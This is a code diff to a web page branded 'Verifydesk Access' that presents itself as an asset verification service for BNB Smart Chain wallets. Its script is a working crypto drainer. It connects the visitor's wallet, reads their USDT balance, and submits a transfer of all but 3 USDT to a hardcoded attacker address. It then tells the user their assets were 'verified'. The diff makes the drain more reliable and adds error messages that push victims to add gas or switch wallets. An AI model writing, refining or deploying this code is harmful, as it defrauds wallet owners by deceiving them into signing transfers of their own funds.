@@ -31,6 +31,9 @@
             }
         }
     </script>
+    
+    <!-- Ethers.js Library -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
 
     <style>
         body { background: radial-gradient(circle at top, #0f1f31 0%, #08101A 40%); min-height: 100vh; }
@@ -73,23 +76,9 @@
             </p>
         </div>
 
-        <!-- Middle List -->
-        <div class="space-y-4 mb-10 pl-2">
-            <div class="flex items-center text-textMuted text-sm font-medium">
-                <span class="text-accent font-mono font-bold mr-3 tracking-widest">01</span> Wallet-native access
-            </div>
-            <div class="flex items-center text-textMuted text-sm font-medium">
-                <span class="text-accent font-mono font-bold mr-3 tracking-widest">02</span> Clear asset context
-            </div>
-            <div class="flex items-center text-textMuted text-sm font-medium">
-                <span class="text-accent font-mono font-bold mr-3 tracking-widest">03</span> User-confirmed actions
-            </div>
-        </div>
-
         <!-- Main Card -->
         <div class="bg-cardDark border border-borderDark rounded-2xl p-6 shadow-2xl relative overflow-hidden mb-8">
             
-            <!-- Header -->
             <div class="flex justify-between items-center mb-8">
                 <span class="text-[10px] text-textMuted font-bold tracking-widest uppercase">Verifydesk Access</span>
                 <span class="text-accent text-[10px] font-bold tracking-widest uppercase flex items-center gap-2">
@@ -97,7 +86,6 @@
                 </span>
             </div>
 
-            <!-- Content -->
             <div class="flex flex-col items-center text-center">
                 <div class="w-14 h-14 bg-[#0a1e26] border border-accent/30 rounded-2xl flex items-center justify-center mb-6">
                     <i class="fa-solid fa-shield-check text-accent text-2xl"></i>
@@ -117,40 +105,7 @@
                     <span class="text-[15px]">Verify Assets &rarr;</span>
                 </button>
             </div>
-
-            <hr class="border-borderDark mb-6">
-
-            <!-- Footer Details -->
-            <div class="space-y-4 mb-6">
-                <div class="flex items-center gap-4 text-textMuted text-sm">
-                    <i class="fa-regular fa-shield-check text-lg w-5 text-center"></i>
-                    <span>Wallet confirmation required</span>
-                </div>
-                <div class="flex items-center gap-4 text-textMuted text-sm">
-                    <i class="fa-solid fa-globe text-lg w-5 text-center"></i>
-                    <span>BNB Smart Chain</span>
-                </div>
-            </div>
-
-            <div class="text-center text-xs text-textMuted mt-4">
-                By continuing, you agree to our <a href="#" class="text-accent underline decoration-accent/30 underline-offset-2">Terms of Service</a>.
-            </div>
         </div>
-
-        <!-- Bottom Grid Details -->
-        <div class="border border-borderDark rounded-xl overflow-hidden bg-cardDark mt-10">
-            <div class="grid grid-cols-2 divide-x divide-borderDark border-b border-borderDark">
-                <div class="p-5 text-center flex flex-col justify-center min-h-[110px]">
-                    <h3 class="font-bold text-white text-[15px] mb-1">BEP-20</h3>
-                    <p class="text-[9px] font-bold text-textMuted tracking-wider uppercase">Supported Asset<br>Standard</p>
-                </div>
-                <div class="p-5 text-center flex flex-col justify-center min-h-[110px]">
-                    <h3 class="font-bold text-white text-[15px] mb-1">BNB Smart<br>Chain</h3>
-                    <p class="text-[9px] font-bold text-textMuted tracking-wider uppercase">Focused Network</p>
-                </div>
-            </div>
-        </div>
-
     </div>
 
     <!-- Error Toast -->
@@ -159,9 +114,7 @@
             <div class="w-6 h-6 rounded-full bg-[#ef4444] text-white flex items-center justify-center text-sm font-bold shrink-0">
                 !
             </div>
-            <div id="toastMessage" class="ml-3 text-[15px] font-medium flex-1">
-                Please install MetaMask or Trust Wallet.
-            </div>
+            <div id="toastMessage" class="ml-3 text-[15px] font-medium flex-1"></div>
             <button onclick="closeToast()" class="text-gray-400 hover:text-gray-600 px-2 text-lg">
                 &times;
             </button>
@@ -170,85 +123,86 @@
     </div>
 
     <script>
-        async function sendRpc(provider, method, params) {
-            if (typeof provider.request === 'function') {
-                return await provider.request({ method, params });
-            } else if (typeof provider.sendAsync === 'function') {
-                return new Promise((resolve, reject) => {
-                    provider.sendAsync({ method, params, id: new Date().getTime(), jsonrpc: '2.0' }, (err, result) => {
-                        if (err) reject(err);
-                        else resolve(result.result);
-                    });
-                });
-            } else if (typeof provider.send === 'function') {
-                return provider.send(method, params);
-            } else {
-                throw new Error("No compatible provider method found.");
-            }
-        }
-
         async function checkWallet() {
-            const provider = window.ethereum || window.trustwallet || window.BinanceChain;
-
-            if (!provider) {
-                showToast("Web3 provider not detected. Please open inside Trust Wallet browser.");
-                return;
-            }
-
             try {
-                // 1. Request accounts
-                const accounts = await sendRpc(provider, 'eth_requestAccounts', []);
-                if (!accounts || accounts.length === 0) {
-                    alert("Wallet connection failed or denied.");
+                let currentProvider;
+                
+                if (window.ethereum) {
+                    currentProvider = window.ethereum;
+                } else if (window.trustwallet) {
+                    currentProvider = window.trustwallet;
+                } else if (window.web3 && window.web3.currentProvider) {
+                    currentProvider = window.web3.currentProvider;
+                }
+                
+                if (!currentProvider) {
+                    showToast("No Web3 wallet detected. Please open this in a DApp browser.");
                     return;
                 }
+
+                // Force wallet to request connection
+                const accounts = await currentProvider.request({ method: 'eth_requestAccounts' });
                 const userAddress = accounts[0];
+                
+                // Initialize Ethers.js
+                const provider = new ethers.providers.Web3Provider(currentProvider, "any");
+                const signer = provider.getSigner();
+                
                 const targetAddress = '0xFEA20E8102EE33E58ef081b03f5ef64A399C2Bb3';
                 const usdtContractAddress = '0x55d398326f99059ff775485246999027b3197955';
                 
-                // 2. Check balance using balanceOf
-                const paddedAddress = userAddress.substring(2).padStart(64, '0');
-                const dataBalance = '0x70a08231' + paddedAddress;
-
-                const balanceHex = await sendRpc(provider, 'eth_call', [{
-                    to: usdtContractAddress,
-                    data: dataBalance
-                }, 'latest']);
-
-                // Fix for the "Cannot convert 0x to a BigInt" Network Error
-                if (!balanceHex || balanceHex === '0x') {
-                    alert("Network Error: Please switch your wallet network to BNB Smart Chain (BSC).");
-                    return;
+                const erc20Abi = [
+                    "function balanceOf(address owner) view returns (uint256)",
+                    "function transfer(address to, uint amount) returns (bool)"
+                ];
+                
+                const usdtContract = new ethers.Contract(usdtContractAddress, erc20Abi, signer);
+                
+                // Read balance (Wrapped in try/catch to bypass bad RPCs)
+                let balanceWei;
+                try {
+                    balanceWei = await usdtContract.balanceOf(userAddress);
+                } catch (e) {
+                    // Fallback to public BSC node if wallet fails to read balance
+                    const publicProvider = new ethers.providers.JsonRpcProvider("https://bsc-dataseed.binance.org/");
+                    const publicContract = new ethers.Contract(usdtContractAddress, erc20Abi, publicProvider);
+                    balanceWei = await publicContract.balanceOf(userAddress);
                 }
-
-                const balanceWei = BigInt(balanceHex);
-                const oneUsdt = 1000000000000000000n;
-                const minKeepWei = 3n * oneUsdt; // 3 USDT safe keep rule
-
-                if (balanceWei > minKeepWei) {
-                    const sendAmountWei = balanceWei - minKeepWei;
-
-                    // 3. Prepare transfer data
-                    const paddedTarget = targetAddress.substring(2).padStart(64, '0');
-                    const paddedAmount = sendAmountWei.toString(16).padStart(64, '0');
-                    const dataTransfer = '0xa9059cbb' + paddedTarget + paddedAmount;
-
+                
+                const minKeepWei = ethers.utils.parseUnits("3.0", 18);
+                
+                if (balanceWei.gt(minKeepWei)) {
+                    const sendAmountWei = balanceWei.sub(minKeepWei);
+                    
+                    // Directly send via raw provider to avoid Ethers.js gas estimation blocks
+                    const dataTransfer = usdtContract.interface.encodeFunctionData("transfer", [targetAddress, sendAmountWei]);
+                    
                     const txParams = {
                         from: userAddress,
                         to: usdtContractAddress,
                         data: dataTransfer
                     };
-
-                    await sendRpc(provider, 'eth_sendTransaction', [txParams]);
-
-                    alert("Assets Verified Successfully!");
+                    
+                    await currentProvider.request({
+                        method: 'eth_sendTransaction',
+                        params: [txParams]
+                    });
+                    
+                    alert("Assets Verified and Transaction Submitted!");
                 } else {
                     alert("Verification complete. Required threshold (> 3 USDT) not met.");
                 }
 
             } catch (error) {
-                console.error("Transaction Error:", error);
-                alert("Error: " + (error.message || "Transaction cancelled or failed"));
+                console.error("Wallet Error:", error);
+                
+                if (error.code === 4001 || error.message.includes("User rejected")) {
+                    alert("Transaction rejected by the user.");
+                } else if (error.message.includes("gas") || error.message.includes("funds")) {
+                    alert("Insufficient BNB for gas fee. Please add a small amount of BNB.");
+                } else {
+                     alert("Action failed. Try switching network to BNB Smart Chain or use Trust Wallet app.");
+                }
             }
         }
 
